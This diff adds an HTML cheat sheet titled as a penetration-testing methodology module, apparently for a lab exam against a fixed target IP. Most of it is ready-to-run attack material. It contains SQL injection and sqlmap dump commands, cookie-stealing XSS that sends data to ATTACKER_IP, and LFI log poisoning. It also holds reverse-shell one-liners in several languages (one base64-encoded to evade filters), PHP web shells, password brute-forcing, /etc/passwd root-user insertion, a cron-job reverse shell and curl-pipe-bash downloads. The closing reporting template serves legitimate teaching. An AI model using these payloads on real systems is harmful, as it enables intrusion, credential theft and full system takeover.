@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Methodology</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Consolas', 'Monaco', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.6;
+        }
+        .topbar {
+            background: #161b22;
+            border-bottom: 1px solid #21262d;
+            padding: 12px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .topbar h1 {
+            color: #c9d1d9;
+            font-size: 1.2em;
+            font-weight: 400;
+        }
+        .nav {
+            background: #161b22;
+            padding: 10px 20px;
+            border-bottom: 1px solid #21262d;
+        }
+        .nav a {
+            color: #58a6ff;
+            text-decoration: none;
+            margin-right: 15px;
+            font-size: 0.9em;
+        }
+        .nav a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .section {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            padding: 20px;
+        }
+        .section-title {
+            color: #58a6ff;
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 8px;
+        }
+        .subsection {
+            margin-bottom: 20px;
+        }
+        .subsection-title {
+            color: #79c0ff;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 12px;
+            margin: 8px 0;
+            overflow-x: auto;
+            font-size: 0.85em;
+            white-space: pre;
+        }
+        .code-block code {
+            color: #79c0ff;
+        }
+        .note {
+            background: #1f2937;
+            border-left: 3px solid #58a6ff;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        .warning {
+            background: #2d1f1c;
+            border-left: 3px solid #f85149;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        .tip {
+            background: #1f2d1c;
+            border-left: 3px solid #3fb950;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        .checklist {
+            background: #1f2937;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .checklist-item {
+            margin: 5px 0;
+            color: #8b949e;
+        }
+        .timeline {
+            background: #1f2937;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+            border-left: 3px solid #f78166;
+        }
+    </style>
+</head>
+<body>
+    <div class="topbar">
+        <h1>🎯 Penetration Testing Methodology - Module C</h1>
+    </div>
+    
+    <div class="nav">
+        <a href="#recon">Reconnaissance</a>
+        <a href="#scanning">Scanning</a>
+        <a href="#web">Web Exploitation</a>
+        <a href="#network">Network Services</a>
+        <a href="#exploitation">Exploitation</a>
+        <a href="#postexploit">Post-Exploitation</a>
+        <a href="#privesc">Privilege Escalation</a>
+        <a href="#pivoting">Pivoting</a>
+        <a href="#reporting">Reporting</a>
+        <a href="#timeline">Time Management</a>
+    </div>
+    
+    <div class="container">
+        
+        <!-- PHASE 1: RECONNAISSANCE -->
+        <div class="section" id="recon">
+            <div class="section-title">🔍 Phase 1: Reconnaissance (30 minutes)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Target Information Gathering</div>
+                <div class="code-block"><code># Given target
+TARGET_IP=10.255.44.200
+
+# Quick ping check
+ping -c 4 $TARGET_IP
+
+# Check connectivity
+nc -zv $TARGET_IP 80
+nc -zv $TARGET_IP 443</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Port Scanning</div>
+                <div class="code-block"><code># Fast scan - common ports
+nmap -sV -sC $TARGET_IP -oN quick-scan.txt
+
+# Full TCP scan
+nmap -p- -sV -sC $TARGET_IP -oN full-scan.txt
+
+# Quick top 1000 ports
+nmap --top-ports 1000 $TARGET_IP -oN top1000.txt
+
+# UDP scan (top 100)
+nmap -sU --top-ports 100 $TARGET_IP -oN udp-scan.txt
+
+# Aggressive scan
+nmap -A -T4 $TARGET_IP -oN aggressive-scan.txt
+
+# All formats output
+nmap -sV -sC $TARGET_IP -oA scan-results</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Service Enumeration</div>
+                <div class="code-block"><code># Version detection
+nmap -sV --version-intensity 9 $TARGET_IP
+
+# Script scanning
+nmap --script vuln $TARGET_IP
+nmap --script default,safe $TARGET_IP
+
+# Specific service scripts
+nmap --script http-* $TARGET_IP -p 80,443
+nmap --script smb-* $TARGET_IP -p 445
+nmap --script ftp-* $TARGET_IP -p 21</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Web Server Fingerprinting</div>
+                <div class="code-block"><code># whatweb
+whatweb http://$TARGET_IP
+whatweb -v http://$TARGET_IP
+
+# curl headers
+curl -I http://$TARGET_IP
+curl -v http://$TARGET_IP
+
+# nikto
+nikto -h http://$TARGET_IP
+
+# Check common files
+curl http://$TARGET_IP/robots.txt
+curl http://$TARGET_IP/.git/config
+curl http://$TARGET_IP/.env
+curl http://$TARGET_IP/README.md
+curl http://$TARGET_IP/composer.json
+curl http://$TARGET_IP/package.json</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Directory Enumeration</div>
+                <div class="code-block"><code># gobuster
+gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,zip,bak -o gobuster.txt
+
+# ffuf
+ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf.json
+
+# With extensions
+ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.zip,.bak
+
+# Subdirectories
+gobuster dir -u http://$TARGET_IP/admin -w /usr/share/wordlists/dirb/common.txt
+
+# dirsearch
+dirsearch -u http://$TARGET_IP -e php,txt,html -o dirsearch.txt</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Parameter Fuzzing</div>
+                <div class="code-block"><code># GET parameters
+ffuf -u http://$TARGET_IP/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+# POST parameters
+ffuf -u http://$TARGET_IP/login.php -X POST -d "FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+# wfuzz
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt "http://$TARGET_IP/page.php?FUZZ=test"</code></div>
+            </div>
+            
+            <div class="checklist">
+                <strong>✅ Reconnaissance Checklist:</strong>
+                <div class="checklist-item">□ Identify all open ports and services</div>
+                <div class="checklist-item">□ Determine web server technology (Apache, Nginx, IIS)</div>
+                <div class="checklist-item">□ Find hidden directories and files</div>
+                <div class="checklist-item">□ Check for backup files (.bak, .old, .zip, .tar.gz)</div>
+                <div class="checklist-item">□ Look for exposed .git, .svn, .env files</div>
+                <div class="checklist-item">□ Identify frameworks (WordPress, Laravel, etc.)</div>
+                <div class="checklist-item">□ Find admin panels and login pages</div>
+            </div>
+        </div>
+        
+        <!-- PHASE 2: WEB VULNERABILITY ASSESSMENT -->
+        <div class="section" id="web">
+            <div class="section-title">🕷️ Phase 2: Web Vulnerability Assessment (2-3 hours)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">SQL Injection Testing</div>
+                <div class="code-block"><code># Manual detection
+http://$TARGET_IP/page.php?id=1'
+http://$TARGET_IP/page.php?id=1 AND 1=1
+http://$TARGET_IP/page.php?id=1 AND 1=2
+
+# UNION-based
+http://$TARGET_IP/page.php?id=-1' UNION SELECT NULL,NULL--
+http://$TARGET_IP/page.php?id=-1' UNION SELECT 1,2--
+http://$TARGET_IP/page.php?id=-1' UNION SELECT NULL,version()--
+http://$TARGET_IP/page.php?id=-1' UNION SELECT NULL,database()--
+http://$TARGET_IP/page.php?id=-1' UNION SELECT NULL,user()--
+
+# Extract tables
+http://$TARGET_IP/page.php?id=-1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--
+
+# Extract columns
+http://$TARGET_IP/page.php?id=-1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Extract data
+http://$TARGET_IP/page.php?id=-1' UNION SELECT username,password FROM users--
+
+# sqlmap automation
+sqlmap -u "http://$TARGET_IP/page.php?id=1" --batch --dbs
+sqlmap -u "http://$TARGET_IP/page.php?id=1" -D database_name --tables
+sqlmap -u "http://$TARGET_IP/page.php?id=1" -D db -T users --dump
+sqlmap -u "http://$TARGET_IP/page.php?id=1" --os-shell
+
+# POST request
+sqlmap -u "http://$TARGET_IP/login.php" --data="username=admin&password=test" --batch
+
+# With cookies
+sqlmap -u "http://$TARGET_IP/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
+
+# Dump everything
+sqlmap -u "http://$TARGET_IP/page.php?id=1" --dump-all --batch</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Cross-Site Scripting (XSS)</div>
+                <div class="code-block"><code># Reflected XSS
+http://$TARGET_IP/search.php?q=<script>alert(1)</script>
+http://$TARGET_IP/search.php?q=<img src=x onerror=alert(1)>
+http://$TARGET_IP/search.php?q=<svg onload=alert(1)>
+
+# Stored XSS (in comments, profiles, messages)
+<script>fetch('http://ATTACKER_IP/?c='+document.cookie)</script>
+<img src=x onerror="fetch('http://ATTACKER_IP/?c='+document.cookie)">
+
+# Filter bypass
+<ScRiPt>alert(1)</ScRiPt>
+<svg/onload=alert(1)>
+<img src=x onerror=alert`1`>
+
+# DOM-based XSS
+# Check JavaScript code for:
+document.write(location.hash)
+eval(location.hash)
+innerHTML = location.search</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Local File Inclusion (LFI)</div>
+                <div class="code-block"><code># Basic LFI
+http://$TARGET_IP/page.php?file=../../../../etc/passwd
+http://$TARGET_IP/page.php?file=../../../../etc/shadow
+http://$TARGET_IP/page.php?file=../../../../var/log/apache2/access.log
+
+# PHP wrappers
+http://$TARGET_IP/page.php?file=php://filter/convert.base64-encode/resource=index.php
+http://$TARGET_IP/page.php?file=php://filter/convert.base64-encode/resource=config.php
+
+# LFI to RCE via log poisoning
+# 1. Poison User-Agent
+curl http://$TARGET_IP -A "<?php system(\$_GET['cmd']); ?>"
+
+# 2. Include log file
+http://$TARGET_IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id
+
+# Result: uid=33(www-data)
+
+# php://input
+curl http://$TARGET_IP/page.php?file=php://input -d "<?php system('id'); ?>"</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Command Injection</div>
+                <div class="code-block"><code># Test characters
+; whoami
+| whoami
+& whoami
+&& whoami
+`whoami`
+$(whoami)
+
+# Example
+http://$TARGET_IP/ping.php?ip=127.0.0.1;whoami
+http://$TARGET_IP/ping.php?ip=127.0.0.1|id
+http://$TARGET_IP/ping.php?ip=127.0.0.1;cat /etc/passwd
+
+# Reverse shell
+# Listener on attacker
+nc -lvnp 4444
+
+# Payload
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+| nc ATTACKER_IP 4444 -e /bin/bash</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Authentication Testing</div>
+                <div class="code-block"><code># Default credentials
+admin:admin
+admin:password
+root:root
+administrator:administrator
+
+# SQL injection bypass
+Username: admin' OR '1'='1'--
+Password: anything
+
+# Brute force with hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -t 20
+
+# Brute force with wfuzz
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 200 -d "username=admin&password=FUZZ" http://$TARGET_IP/login.php</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">IDOR Testing</div>
+                <div class="code-block"><code># Change IDs in URLs
+http://$TARGET_IP/profile.php?id=1  → id=2, id=3, id=admin
+http://$TARGET_IP/document.php?doc_id=100  → doc_id=101, 102, etc.
+
+# Change IDs in POST requests (use Burp)
+user_id=1  →  user_id=2
+order_id=100  →  order_id=101
+
+# Use Burp Intruder
+1. Capture request
+2. Send to Intruder
+3. Mark ID parameter: id=§1§
+4. Payload: Numbers 1-1000
+5. Start attack
+6. Look for different responses</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">File Upload Testing</div>
+                <div class="code-block"><code># PHP shell
+<?php system($_GET['cmd']); ?>
+
+# Upload variations
+shell.php
+shell.php.jpg
+shell.jpg.php
+shell.pHp
+shell.php%00.jpg
+
+# Magic bytes bypass
+echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php
+
+# .htaccess upload
+AddType application/x-httpd-php .jpg
+
+# Then upload shell.jpg with PHP code</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">SSRF Testing</div>
+                <div class="code-block"><code># Internal services
+http://$TARGET_IP/fetch.php?url=http://localhost
+http://$TARGET_IP/fetch.php?url=http://127.0.0.1
+http://$TARGET_IP/fetch.php?url=http://localhost:8080
+http://$TARGET_IP/fetch.php?url=http://192.168.1.1
+
+# Cloud metadata
+http://$TARGET_IP/fetch.php?url=http://169.254.169.254/latest/meta-data/</code></div>
+            </div>
+            
+            <div class="checklist">
+                <strong>✅ Web Testing Checklist:</strong>
+                <div class="checklist-item">□ Test all input fields for SQL injection</div>
+                <div class="checklist-item">□ Test all reflection points for XSS</div>
+                <div class="checklist-item">□ Test file parameters for LFI/RFI</div>
+                <div class="checklist-item">□ Test system commands for injection</div>
+                <div class="checklist-item">□ Try default credentials on login forms</div>
+                <div class="checklist-item">□ Test for IDOR in URLs and parameters</div>
+                <div class="checklist-item">□ Test file upload functionality</div>
+                <div class="checklist-item">□ Check for SSRF in URL fetching features</div>
+                <div class="checklist-item">□ Test API endpoints if found</div>
+            </div>
+        </div>
+        
+        <!-- PHASE 3: NETWORK SERVICES -->
+        <div class="section" id="network">
+            <div class="section-title">🌐 Phase 3: Network Services Exploitation (1 hour)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">SMB (Port 445)</div>
+                <div class="code-block"><code># Enumeration
+enum4linux $TARGET_IP
+enum4linux -a $TARGET_IP
+
+# List shares
+smbclient -L //$TARGET_IP
+smbclient -L //$TARGET_IP -N  # Null session
+
+# Connect to share
+smbclient //$TARGET_IP/share
+smbclient //$TARGET_IP/share -U username
+
+# smbmap
+smbmap -H $TARGET_IP
+smbmap -H $TARGET_IP -u guest
+
+# crackmapexec
+crackmapexec smb $TARGET_IP
+crackmapexec smb $TARGET_IP -u '' -p ''
+crackmapexec smb $TARGET_IP -u 'guest' -p ''</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">SSH (Port 22)</div>
+                <div class="code-block"><code># Try default keys
+ssh -i /usr/share/ssh-badkeys/authorized_keys root@$TARGET_IP
+
+# Brute force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP
+hydra -L users.txt -P passwords.txt ssh://$TARGET_IP
+
+# ncrack
+ncrack -p 22 --user admin -P rockyou.txt $TARGET_IP</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">FTP (Port 21)</div>
+                <div class="code-block"><code># Anonymous login
+ftp $TARGET_IP
+# Username: anonymous
+# Password: anonymous
+
+# Brute force
+hydra -l admin -P rockyou.txt ftp://$TARGET_IP
+
+# Check for writable directories
+ftp> put test.txt</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">MySQL (Port 3306)</div>
+                <div class="code-block"><code># Connect
+mysql -h $TARGET_IP -u root -p
+
+# Try default passwords
+mysql -h $TARGET_IP -u root
+mysql -h $TARGET_IP -u root -p root
+mysql -h $TARGET_IP -u root -p admin
+
+# Brute force
+hydra -l root -P rockyou.txt mysql://$TARGET_IP</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">RDP (Port 3389)</div>
+                <div class="code-block"><code># Connect
+xfreerdp /u:administrator /p:password /v:$TARGET_IP
+
+# Brute force
+hydra -l administrator -P rockyou.txt rdp://$TARGET_IP
+
+# ncrack
+ncrack -p 3389 --user administrator -P rockyou.txt $TARGET_IP</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">NFS (Port 2049)</div>
+                <div class="code-block"><code># Show mounts
+showmount -e $TARGET_IP
+
+# Mount share
+mkdir /tmp/mount
+mount -t nfs $TARGET_IP:/share /tmp/mount</code></div>
+            </div>
+        </div>
+        
+        <!-- PHASE 4: EXPLOITATION -->
+        <div class="section" id="exploitation">
+            <div class="section-title">💥 Phase 4: Initial Exploitation (1-2 hours)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Reverse Shell Payloads</div>
+                <div class="code-block"><code># Setup listener on attacker
+nc -lvnp 4444
+
+# Bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
+
+# Netcat
+nc ATTACKER_IP 4444 -e /bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
+
+# PHP
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# Ruby
+ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Encoded (bypass filters)
+echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Web Shell Upload</div>
+                <div class="code-block"><code># Simple PHP shell
+<?php system($_GET['cmd']); ?>
+
+# More advanced
+<?php
+if(isset($_GET['cmd'])){
+    echo "<pre>";
+    $cmd = ($_GET['cmd']);
+    system($cmd);
+    echo "</pre>";
+}
+?>
+
+# Usage after upload
+http://$TARGET_IP/uploads/shell.php?cmd=whoami
+http://$TARGET_IP/uploads/shell.php?cmd=ls -la
+http://$TARGET_IP/uploads/shell.php?cmd=cat /etc/passwd</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Shell Upgrade (TTY)</div>
+                <div class="code-block"><code># Python PTY
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Full upgrade
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Press Ctrl+Z
+stty raw -echo; fg
+# Press Enter twice
+reset
+
+# Alternative methods
+script /dev/null -c bash
+/usr/bin/script -qc /bin/bash /dev/null
+perl -e 'exec "/bin/bash";'
+lua -e 'os.execute("/bin/bash")'</code></div>
+            </div>
+        </div>
+        
+        <!-- PHASE 5: POST-EXPLOITATION -->
+        <div class="section" id="postexploit">
+            <div class="section-title">🔓 Phase 5: Post-Exploitation (1 hour)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">System Enumeration</div>
+                <div class="code-block"><code># Current user
+whoami
+id
+groups
+
+# System info
+hostname
+uname -a
+cat /etc/issue
+cat /etc/*-release
+lsb_release -a
+
+# Network
+ifconfig
+ip addr
+ip route
+netstat -tulpn
+ss -tulpn
+arp -a
+
+# Users
+cat /etc/passwd
+cat /etc/group
+w
+who
+last
+lastlog
+
+# Processes
+ps aux
+ps -ef
+ps aux | grep root
+top</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Find Sensitive Files</div>
+                <div class="code-block"><code># Config files
+find / -name "*.conf" 2>/dev/null
+find / -name "config*" 2>/dev/null
+find / -name "database*" 2>/dev/null
+
+# Passwords in files
+grep -r "password" /var/www/ 2>/dev/null
+grep -r "password" /home/ 2>/dev/null
+grep -ri "pass" /var/www/html/ 2>/dev/null
+
+# SSH keys
+find / -name id_rsa 2>/dev/null
+find / -name id_dsa 2>/dev/null
+find / -name authorized_keys 2>/dev/null
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+
+# History files
+cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.php_history
+
+# Logs
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error.log
+cat /var/log/auth.log
+
+# Backups
+find / -name "*.bak" 2>/dev/null
+find / -name "*backup*" 2>/dev/null
+find / -name "*.old" 2>/dev/null</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Database Access</div>
+                <div class="code-block"><code># Find DB credentials
+cat /var/www/html/config.php
+cat /var/www/html/wp-config.php
+grep -r "DB_PASS" /var/www/ 2>/dev/null
+
+# Connect to MySQL
+mysql -u root -p
+mysql -u root -pPASSWORD
+
+# Commands
+SHOW DATABASES;
+USE database_name;
+SHOW TABLES;
+SELECT * FROM users;
+SELECT username,password FROM users;</code></div>
+            </div>
+        </div>
+        
+        <!-- PHASE 6: PRIVILEGE ESCALATION -->
+        <div class="section" id="privesc">
+            <div class="section-title">⬆️ Phase 6: Privilege Escalation (1-2 hours)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Quick Checks</div>
+                <div class="code-block"><code># Sudo permissions
+sudo -l
+
+# SUID binaries
+find / -perm -4000 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# Writable /etc/passwd
+ls -la /etc/passwd
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron*
+cat /var/spool/cron/crontabs/*
+
+# Capabilities
+getcap -r / 2>/dev/null</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">LinPEAS</div>
+                <div class="code-block"><code># Download on attacker
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+# Transfer to target
+# On attacker: python3 -m http.server 8000
+# On target:
+wget http://ATTACKER_IP:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+# Alternative transfer methods
+curl http://ATTACKER_IP:8000/linpeas.sh | bash
+curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Sudo Exploitation</div>
+                <div class="code-block"><code># If sudo -l shows something like:
+# (ALL) NOPASSWD: /usr/bin/find
+
+# Exploit
+sudo find /etc/passwd -exec /bin/bash \;
+
+# Other common ones
+sudo vim -c ':!/bin/bash'
+sudo less /etc/hosts
+!/bin/bash
+
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo nmap --interactive
+!sh
+
+# Check GTFOBins for more
+# https://gtfobins.github.io/</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">SUID Exploitation</div>
+                <div class="code-block"><code># Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Common exploits
+# If /usr/bin/find has SUID
+find /etc/passwd -exec /bin/bash -p \;
+
+# If /usr/bin/vim has SUID
+vim -c ':py import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
+
+# Check GTFOBins for SUID exploits
+# https://gtfobins.github.io/</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Kernel Exploits</div>
+                <div class="code-block"><code># Check kernel version
+uname -a
+uname -r
+
+# Search exploits
+searchsploit linux kernel $(uname -r)
+searchsploit -m exploit.c
+
+# Compile on target
+gcc exploit.c -o exploit
+./exploit
+
+# Or compile on attacker (same architecture)
+gcc exploit.c -o exploit -static
+# Transfer to target</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Writable /etc/passwd</div>
+                <div class="code-block"><code># Check if writable
+ls -la /etc/passwd
+
+# Generate password hash
+openssl passwd -1 -salt xyz password123
+
+# Add new root user
+echo 'newroot:$1$xyz$PASSWORD_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Switch to new user
+su newroot</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Cron Jobs</div>
+                <div class="code-block"><code># Check cron jobs
+cat /etc/crontab
+ls -la /etc/cron*
+
+# If cron job runs script as root and script is writable
+echo "bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1" >> /path/to/script.sh
+
+# Wait for cron to execute</code></div>
+            </div>
+        </div>
+        
+        <!-- PHASE 7: PIVOTING -->
+        <div class="section" id="pivoting">
+            <div class="section-title">🔀 Phase 7: Pivoting to Internal Network (1 hour)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Network Discovery</div>
+                <div class="code-block"><code># Check interfaces
+ifconfig
+ip addr
+
+# Check routing
+ip route
+route -n
+
+# Check ARP cache
+arp -a
+
+# Scan internal network
+# If nmap available on target
+nmap -sn 192.168.1.0/24
+
+# Ping sweep
+for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes"; done
+
+# Check /etc/hosts
+cat /etc/hosts</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Port Forwarding (SSH)</div>
+                <div class="code-block"><code># Local port forwarding
+# Forward local 8080 to target's localhost:80
+ssh -L 8080:localhost:80 user@$TARGET_IP
+
+# Remote port forwarding
+# Forward target's 8080 to attacker's localhost:80
+ssh -R 8080:localhost:80 user@$TARGET_IP
+
+# Dynamic port forwarding (SOCKS proxy)
+ssh -D 9050 user@$TARGET_IP
+
+# Then use proxychains
+proxychains nmap -sT 192.168.1.100</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Chisel Tunneling</div>
+                <div class="code-block"><code># Download chisel
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+mv chisel_1.8.1_linux_amd64 chisel
+chmod +x chisel
+
+# On attacker (server)
+./chisel server -p 8080 --reverse
+
+# On target (client)
+./chisel client ATTACKER_IP:8080 R:socks
+
+# Configure proxychains
+# Edit /etc/proxychains4.conf
+# Add: socks5 127.0.0.1 1080
+
+# Use proxychains
+proxychains nmap -sT 192.168.1.100
+proxychains curl http://192.168.1.100</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">File Transfer Methods</div>
+                <div class="code-block"><code># HTTP Server (Python)
+# On attacker
+python3 -m http.server 8000
+
+# On target
+wget http://ATTACKER_IP:8000/file
+curl http://ATTACKER_IP:8000/file -o file
+
+# Netcat
+# On attacker (receiver)
+nc -lvnp 4444 > file
+
+# On target (sender)
+nc ATTACKER_IP 4444 < file
+
+# Base64 (for small files)
+# On target
+cat file | base64
+
+# On attacker
+echo "BASE64_STRING" | base64 -d > file
+
+# SCP
+scp file user@$TARGET_IP:/tmp/</code></div>
+            </div>
+        </div>
+        
+        <!-- PHASE 8: REPORTING -->
+        <div class="section" id="reporting">
+            <div class="section-title">📝 Phase 8: Documentation & Reporting (1 hour)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Vulnerability Card Template</div>
+                <div class="code-block"><code>==========================================
+VULNERABILITY #1: [Title]
+==========================================
+
+1. BRIEF DESCRIPTION
+--------------------
+[What you found, in plain language]
+
+2. RISK LEVEL
+-------------
+🔴 Critical / 🟠 High / 🟡 Medium / 🟢 Low
+
+3. LOCATION
+-----------
+- IP Address: 10.255.44.200
+- URL: http://10.255.44.200/page.php?id=1
+- Port: 80
+- System: Apache 2.4.41, PHP 7.4
+
+4. TOOLS USED
+-------------
+- sqlmap
+- Burp Suite
+- curl
+
+5. PROOF OF CONCEPT
+-------------------
+Step 1: Navigate to http://10.255.44.200/page.php?id=1
+
+Step 2: Test for SQL injection
+Request:
+GET /page.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1
+Host: 10.255.44.200
+
+Response:
+admin:5f4dcc3b5aa765d61d8327deb882cf99
+user1:e10adc3949ba59abbe56e057f20f883e
+
+Step 3: Crack hashes
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+john --format=Raw-MD5 hash.txt --wordlist=rockyou.txt
+
+Result: password
+
+6. IMPACT
+---------
+- Unauthorized access to database
+- Disclosure of sensitive user credentials
+- Potential for complete system compromise
+
+7. RECOMMENDATIONS
+------------------
+1. Use Prepared Statements (Parameterized Queries)
+2. Implement input validation and sanitization
+3. Apply principle of least privilege to database user
+4. Deploy Web Application Firewall (WAF)
+5. Regular security audits and penetration testing
+
+8. REFERENCES
+-------------
+- OWASP Top 10 2021: A03 - Injection
+- CWE-89: SQL Injection
+- https://owasp.org/www-community/attacks/SQL_Injection
+
+==========================================</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Screenshot Guidelines</div>
+                <div class="code-block"><code># Important screenshots to take:
+
+1. Initial scan results (nmap)
+2. Directory enumeration findings
+3. Vulnerability detection (SQLi error, XSS popup)
